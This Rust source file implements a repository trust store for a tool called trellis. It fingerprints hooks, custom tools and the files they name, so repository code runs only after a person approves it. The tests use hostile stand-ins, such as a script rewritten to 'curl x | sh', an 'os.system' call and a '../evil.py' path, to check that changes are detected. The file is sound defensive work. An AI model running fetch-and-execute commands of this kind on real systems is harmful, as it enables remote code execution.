//! The trust store (ADR 0023 §4).
//!
//! Cloning a repository and running trellis in it must not execute code the
//! repository supplied until a person has said so. The record of that lives
//! **outside** the repository, in the user's configuration directory, so a
//! repository cannot trust itself; and it is a digest over everything that
//! would run, so changing any of it (a hook's argv, a script a hook names, a
//! custom tool's schema, the bash settings) makes the repository untrusted
//! again.
//!
//! What trust does not cover is said aloud in the ADR: `[checks]` commands
//! have always run without it.

use crate::hooks::HookConfig;
use crate::registry::CustomTool;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};

/// One thing that would execute, as shown by `trellis trust`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct TrustItem {
    /// e.g. `hook pre_tool`, `custom tool lint`, `bash`.
    pub label: String,
    /// The argv, when the item is a command.
    pub argv: Vec<String>,
    /// Anything else that decides what runs: a custom tool's description and
    /// schema, the bash settings.
    pub detail: String,
    /// Repository files the argv names, with their sha256.
    pub files: Vec<(String, String)>,
}

impl TrustItem {
    /// A command, with every argument that names a file inside `root`
    /// hashed. An argument is taken to name a file when it is a relative
    /// path with no `..`, or an absolute path under `root`, and a regular
    /// file is there. A program found on `PATH` is not repository code and is
    /// not hashed; a script the repository ships is.
    ///
    /// The string after `-c` or `-e` (`sh -c`, `python -c`, `node -e`) or
    /// `/C` (`cmd /C`) is code, not a path, so it is also split into
    /// shell-ish tokens and every token that is a file in the repository is
    /// hashed: `["sh", "-c", "./scripts/check.sh"]` covers the script.
    /// Code reached any other way — an import, `python -m pkg.mod`, a file
    /// a script reads — is covered only if it lives under `.trellis/`,
    /// which [`Fingerprint`] hashes whole (ADR 0023 §4).
    pub fn command(root: &Path, label: String, argv: &[String], detail: String) -> Self {
        let mut files: Vec<(String, String)> = Vec::new();
        let mut add = |candidate: &str| {
            if let Some(f) = repo_file(root, candidate)
                && !files.iter().any(|(p, _)| *p == f.0)
            {
                files.push(f);
            }
        };
        for (i, arg) in argv.iter().enumerate() {
            add(arg);
            let is_code = i > 0 && matches!(argv[i - 1].as_str(), "-c" | "-e" | "/C" | "/c");
            if is_code {
                for tok in arg.split(|c: char| {
                    c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | ')' | '<' | '>')
                }) {
                    let tok = tok.trim_matches(|c| matches!(c, '"' | '\'' | '`'));
                    add(tok);
                }
            }
        }
        Self {
            label,
            argv: argv.to_vec(),
            detail,
            files,
        }
    }
}

/// `(repository-relative path, sha256)` when `arg` names a regular file
/// inside `root`: a relative path with no `..`, or an absolute one under
/// `root`. A program found on `PATH` is not repository code and is not
/// hashed; a script the repository ships is.
fn repo_file(root: &Path, arg: &str) -> Option<(String, String)> {
    let p = Path::new(arg);
    let full = if p.is_absolute() {
        if !p.starts_with(root) {
            return None;
        }
        p.to_path_buf()
    } else {
        if arg.is_empty() || p.components().any(|c| c.as_os_str() == "..") {
            return None;
        }
        root.join(p)
    };
    if !full.is_file() {
        return None;
    }
    let bytes = std::fs::read(&full).ok()?;
    Some((rel(root, &full), hex(&Sha256::digest(&bytes))))
}

fn rel(root: &Path, full: &Path) -> String {
    full.strip_prefix(root)
        .unwrap_or(full)
        .to_string_lossy()
        .replace('\\', "/")
        .trim_start_matches("./")
        .to_string()
}

/// Every file under `.trellis/`, sorted, with its sha256 — except what
/// trellis itself writes there on every run (`runs/`, the trails, and
/// `index.bin`, the index cache), which would otherwise make a repository
/// untrusted after each run. Hook and tool code kept under
/// `.trellis/hooks/` or `.trellis/tools/` is covered by this whatever
/// reaches it: an import, `-m`, a file a script reads.
fn dot_trellis_files(root: &Path) -> Vec<(String, String)> {
    fn walk(root: &Path, dir: &Path, top: bool, out: &mut Vec<(String, String)>) {
        let Ok(rd) = std::fs::read_dir(dir) else {
            return;
        };
        for e in rd.filter_map(Result::ok) {
            let path = e.path();
            let name = e.file_name();
            let name = name.to_string_lossy();
            if top && (name == "runs" || name.starts_with("index.bin")) {
                continue;
            }
            let Ok(ft) = e.file_type() else { continue };
            if ft.is_dir() {
                walk(root, &path, false, out);
            } else if let Ok(bytes) = std::fs::read(&path) {
                out.push((rel(root, &path), hex(&Sha256::digest(&bytes))));
            }
        }
    }
    let mut out = Vec::new();
    walk(root, &root.join(".trellis"), true, &mut out);
    out.sort();
    out
}

/// Everything a repository would execute, and one digest over all of it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fingerprint {
    pub items: Vec<TrustItem>,
    pub sha256: String,
}

impl Fingerprint {
    /// Items for the hooks, the custom tools, and the bash settings (given
    /// as text: whatever `[tools]` said about bash, rendered stably by the
    /// caller). An empty fingerprint means there is nothing to trust.
    pub fn of(
        root: &Path,
        hooks: &HookConfig,
        custom: &[CustomTool],
        bash: Option<(Vec<String>, String)>,
    ) -> Self {
        Self::of_with(root, hooks, custom, bash, Vec::new())
    }

    /// As [`of`](Self::of), with further items the binary knows about and
    /// this crate does not: process agents (ADR 0026 §11), whose profiles
    /// the queue crate reads.
    pub fn of_with(
        root: &Path,
        hooks: &HookConfig,
        custom: &[CustomTool],
        bash: Option<(Vec<String>, String)>,
        extra: Vec<TrustItem>,
    ) -> Self {
        let mut items = Vec::new();
        for (event, argv) in hooks.declared() {
            items.push(TrustItem::command(
                root,
                format!("hook {event}"),
                argv,
                format!("timeout_s = {:?}", hooks.timeout_s),
            ));
        }
        for c in custom {
            items.push(TrustItem::command(
                root,
                format!("custom tool {}", c.name),
                &c.command,
                format!("description = {:?}\nschema = {}", c.description, c.schema),
            ));
        }
        if let Some((shell, settings)) = bash {
            items.push(TrustItem::command(
                root,
                "bash".to_string(),
                &shell,
                settings,
            ));
        }
        items.extend(extra);
        // Only when something would execute: a repository that declares
        // nothing still has nothing to trust, whatever `.trellis/` holds.
        if !items.is_empty() {
            items.push(TrustItem {
                label: ".trellis/ (every file)".to_string(),
                argv: Vec::new(),
                detail: "all files under .trellis/ except runs/ and index.bin, which \
                         trellis writes itself"
                    .to_string(),
                files: dot_trellis_files(root),
            });
        }
        let canonical = serde_json::to_vec(&items).expect("a list of strings always serializes");
        Self {
            sha256: hex(&Sha256::digest(&canonical)),
            items,
        }
    }

    pub fn is_empty(&self) -> bool {
        self.items.is_empty()
    }
}

/// Whether a repository's current fingerprint is the one a person trusted.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TrustState {
    Trusted,
    /// Never trusted, or revoked.
    Unknown,
    /// Trusted once, and something has changed since.
    Changed,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct StoreFile {
    #[serde(default)]
    repos: BTreeMap<String, Entry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Entry {
    sha256: String,
    /// Seconds since the Unix epoch.
    trusted_at: u64,
}

/// Where trust is recorded.
#[derive(Debug, Clone)]
pub struct TrustStore {
    path: PathBuf,
}

/// Set once per process by tests, so no test reads or writes the real
/// user's store. Not an environment variable: setting one in a test is
/// unsafe under edition 2024 and races every other test in the process.
static OVERRIDE: OnceLock<PathBuf> = OnceLock::new();

/// Serializes read-modify-write in this process, so two writers cannot each
/// read the file, add their entry, and have the second erase the first.
static LOCK: Mutex<()> = Mutex::new(());

impl TrustStore {
    pub fn at(path: PathBuf) -> Self {
        Self { path }
    }

    /// Points [`user`](Self::user) at `path` for the rest of this process.
    /// For tests; the first call wins.
    pub fn use_for_this_process(path: PathBuf) {
        let _ = OVERRIDE.set(path);
    }

    /// The user's store: `%APPDATA%\trellis\trust.json` on Windows, else
    /// `$XDG_CONFIG_HOME/trellis/trust.json` or `~/.config/trellis/trust.json`.
    pub fn user() -> Result<Self, String> {
        if let Some(p) = OVERRIDE.get() {
            return Ok(Self::at(p.clone()));
        }
        let non_empty = |k: &str| std::env::var_os(k).filter(|v| !v.is_empty());
        let dir = if cfg!(windows) {
            non_empty("APPDATA").map(PathBuf::from)
        } else {
            non_empty("XDG_CONFIG_HOME")
                .map(PathBuf::from)
                .or_else(|| non_empty("HOME").map(|h| PathBuf::from(h).join(".config")))
        };
        dir.map(|d| Self::at(d.join("trellis").join("trust.json")))
            .ok_or_else(|| {
                "no user configuration directory (APPDATA, XDG_CONFIG_HOME or HOME) to keep \
                 trust in"
                    .to_string()
            })
    }

    pub fn path(&self) -> &Path {
        &self.path
    }

    fn read(&self) -> Result<StoreFile, String> {
        match std::fs::read_to_string(&self.path) {
            Ok(s) => serde_json::from_str(&s)
                .map_err(|e| format!("{} is not a trust store: {e}", self.path.display())),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(StoreFile::default()),
            Err(e) => Err(format!("cannot read {}: {e}", self.path.display())),
        }
    }

    fn write(&self, f: &StoreFile) -> Result<(), String> {
        if let Some(dir) = self.path.parent() {
            std::fs::create_dir_all(dir)
                .map_err(|e| format!("cannot create {}: {e}", dir.display()))?;
        }
        let tmp = self.path.with_extension("json.tmp");
        let body = serde_json::to_vec_pretty(f).expect("the store always serializes");
        std::fs::write(&tmp, body).map_err(|e| format!("cannot write {}: {e}", tmp.display()))?;
        std::fs::rename(&tmp, &self.path)
            .map_err(|e| format!("cannot replace {}: {e}", self.path.display()))
    }

    pub fn state(&self, root: &Path, fp: &Fingerprint) -> Result<TrustState, String> {
        let _g = LOCK.lock().unwrap_or_else(|p| p.into_inner());
        Ok(match self.read()?.repos.get(&key(root)) {
            None => TrustState::Unknown,
            Some(e) if e.sha256 == fp.sha256 => TrustState::Trusted,
            Some(_) => TrustState::Changed,
        })
    }

    pub fn trust(&self, root: &Path, fp: &Fingerprint) -> Result<(), String> {
        let _g = LOCK.lock().unwrap_or_else(|p| p.into_inner());
        let mut f = self.read()?;
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        f.repos.insert(
            key(root),
            Entry {
                sha256: fp.sha256.clone(),
                trusted_at: now,
            },
        );
        self.write(&f)
    }

    /// Removes the entry. `Ok(false)` when there was none.
    pub fn revoke(&self, root: &Path) -> Result<bool, String> {
        let _g = LOCK.lock().unwrap_or_else(|p| p.into_inner());
        let mut f = self.read()?;
        let had = f.repos.remove(&key(root)).is_some();
        if had {
            self.write(&f)?;
        }
        Ok(had)
    }
}

/// The canonical repository root, so `C:\r` and `c:\r\.` are one entry.
fn key(root: &Path) -> String {
    std::fs::canonicalize(root)
        .unwrap_or_else(|_| root.to_path_buf())
        .to_string_lossy()
        .into_owned()
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hooks(argv: &[&str]) -> HookConfig {
        HookConfig {
            pre_tool: Some(argv.iter().map(|s| s.to_string()).collect()),
            ..Default::default()
        }
    }

    #[test]
    fn a_change_to_a_script_a_hook_names_makes_the_repository_untrusted_again() {
        // The argv alone is not what runs; the script it names is. Trusting
        // `python hook.py` and then running a different hook.py would be
        // trust in a file name.
        let repo = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        std::fs::write(repo.path().join("hook.py"), "print('ok')\n").unwrap();
        let store = TrustStore::at(home.path().join("trust.json"));
        let h = hooks(&["python", "hook.py"]);

        let fp = Fingerprint::of(repo.path(), &h, &[], None);
        assert_eq!(fp.items[0].files.len(), 1, "the script is hashed");
        assert_eq!(store.state(repo.path(), &fp).unwrap(), TrustState::Unknown);
        store.trust(repo.path(), &fp).unwrap();
        assert_eq!(store.state(repo.path(), &fp).unwrap(), TrustState::Trusted);

        std::fs::write(repo.path().join("hook.py"), "import os; os.system('x')\n").unwrap();
        let fp2 = Fingerprint::of(repo.path(), &h, &[], None);
        assert_eq!(store.state(repo.path(), &fp2).unwrap(), TrustState::Changed);
    }

    #[test]
    fn a_change_to_any_definition_changes_the_digest() {
        let repo = tempfile::tempdir().unwrap();
        let base = Fingerprint::of(repo.path(), &hooks(&["a"]), &[], None);
        let other_argv = Fingerprint::of(repo.path(), &hooks(&["b"]), &[], None);
        let with_bash = Fingerprint::of(
            repo.path(),
            &hooks(&["a"]),
            &[],
            Some((vec!["sh".into(), "-c".into()], "unattended = false".into())),
        );
        let unattended = Fingerprint::of(
            repo.path(),
            &hooks(&["a"]),
            &[],
            Some((vec!["sh".into(), "-c".into()], "unattended = true".into())),
        );
        let custom = Fingerprint::of(
            repo.path(),
            &hooks(&["a"]),
            &[CustomTool {
                name: "lint".into(),
                description: "d".into(),
                command: vec!["x".into()],
                schema: serde_json::json!({ "type": "object" }),
            }],
            None,
        );
        let all = [&base, &other_argv, &with_bash, &unattended, &custom];
        for (i, a) in all.iter().enumerate() {
            for b in &all[i + 1..] {
                assert_ne!(a.sha256, b.sha256);
            }
        }
    }

    #[test]
    fn a_file_outside_the_repository_is_not_taken_as_repository_code() {
        let repo = tempfile::tempdir().unwrap();
        let fp = Fingerprint::of(repo.path(), &hooks(&["python", "../evil.py"]), &[], None);
        assert!(fp.items[0].files.is_empty());
    }

    #[test]
    fn revoking_forgets_and_other_repositories_are_untouched() {
        let a = tempfile::tempdir().unwrap();
        let b = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let store = TrustStore::at(home.path().join("sub").join("trust.json"));
        let fa = Fingerprint::of(a.path(), &hooks(&["x"]), &[], None);
        let fb = Fingerprint::of(b.path(), &hooks(&["x"]), &[], None);
        store.trust(a.path(), &fa).unwrap();
        store.trust(b.path(), &fb).unwrap();
        assert!(store.revoke(a.path()).unwrap());
        assert!(!store.revoke(a.path()).unwrap());
        assert_eq!(store.state(a.path(), &fa).unwrap(), TrustState::Unknown);
        assert_eq!(store.state(b.path(), &fb).unwrap(), TrustState::Trusted);
    }

    #[test]
    fn a_script_named_inside_a_shell_string_is_hashed() {
        // The risk: `["sh", "-c", "./scripts/check.sh"]` names no file as an
        // argv element, so the script it runs was hashed by nothing and
        // could change after trust without anyone being asked again.
        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join("scripts")).unwrap();
        std::fs::write(repo.path().join("scripts/check.sh"), "exit 0\n").unwrap();
        let h = hooks(&["sh", "-c", "./scripts/check.sh --fast && echo ok"]);
        let fp = Fingerprint::of(repo.path(), &h, &[], None);
        assert_eq!(
            fp.items[0]
                .files
                .iter()
                .map(|f| f.0.as_str())
                .collect::<Vec<_>>(),
            ["scripts/check.sh"]
        );
        std::fs::write(repo.path().join("scripts/check.sh"), "curl x | sh\n").unwrap();
        assert_ne!(
            fp.sha256,
            Fingerprint::of(repo.path(), &h, &[], None).sha256
        );
    }

    #[test]
    fn a_change_anywhere_under_dot_trellis_changes_the_digest_except_run_output() {
        // The risk: `python -m tools.hook` reaches code through an import,
        // which no argv names. Code under `.trellis/` is covered whole;
        // what trellis itself writes there (trails, the index cache) is not,
        // or every run would untrust the repository.
        let repo = tempfile::tempdir().unwrap();
        let hooks_dir = repo.path().join(".trellis/hooks");
        std::fs::create_dir_all(&hooks_dir).unwrap();
        std::fs::write(hooks_dir.join("gate.py"), "print('ok')\n").unwrap();
        let h = hooks(&["python", "-m", "gate"]);
        let base = Fingerprint::of(repo.path(), &h, &[], None).sha256;

        std::fs::create_dir_all(repo.path().join(".trellis/runs")).unwrap();
        std::fs::write(repo.path().join(".trellis/runs/r.json"), "{}").unwrap();
        std::fs::write(repo.path().join(".trellis/index.bin"), [0u8, 1, 2]).unwrap();
        assert_eq!(
            base,
            Fingerprint::of(repo.path(), &h, &[], None).sha256,
            "trails and the index cache are trellis's output, not repository code"
        );

        std::fs::write(hooks_dir.join("gate.py"), "import os\n").unwrap();
        assert_ne!(base, Fingerprint::of(repo.path(), &h, &[], None).sha256);

        // With nothing declared there is still nothing to trust.
        assert!(Fingerprint::of(repo.path(), &HookConfig::default(), &[], None).is_empty());
    }

    #[test]
    fn nothing_declared_is_nothing_to_trust() {
        let repo = tempfile::tempdir().unwrap();
        assert!(Fingerprint::of(repo.path(), &HookConfig::default(), &[], None).is_empty());
    }
}
